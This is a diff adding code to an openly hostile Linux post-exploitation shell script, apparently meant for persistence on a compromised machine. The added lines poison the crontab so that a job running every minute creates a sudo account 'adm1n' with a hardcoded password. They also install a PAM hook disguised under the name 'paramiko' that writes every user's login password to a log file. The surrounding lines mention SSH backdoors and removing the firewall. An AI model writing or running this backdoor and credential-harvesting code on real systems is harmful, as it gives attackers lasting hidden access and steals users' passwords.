@@ -72,7 +72,19 @@ for user in `awk -F':' '{ print $1}' /etc/passwd` ; do
 done
 #TODO Establish ssh tunnel https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1
 #TODO poison the crontab
+echo "useradd -p $(openssl passwd -1 adm1n) adm1n && usermod -aG sudo adm1n">/opt/1
+chmod +x /opt/1
+crontab -l > mycron
+echo "* * * * * bash /opt/1" >> mycron
+crontab mycron
+rm mycron
 #TODO PAM poisoning https://titanwolf.org/Network/Articles/Article?AID=5d66043f-b1fe-4d18-8f55-1b5dfc8b2fba
+echo '#!/bin/sh
+echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/secrets.log' > /usr/local/bin/paramiko
+sudo touch /var/log/secrets.log
+sudo chmod 770 /var/log/secrets.log
+echo "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/paramiko" >> /etc/pam.d/common-auth
+sudo chmod 700 /usr/local/bin/paramiko
 #TODO hack PAM to allow login without password
 #Remove iptables and UFW, and block them from being reinstalled
 echo "[*]Removing UFW/iptables and blocking their install"
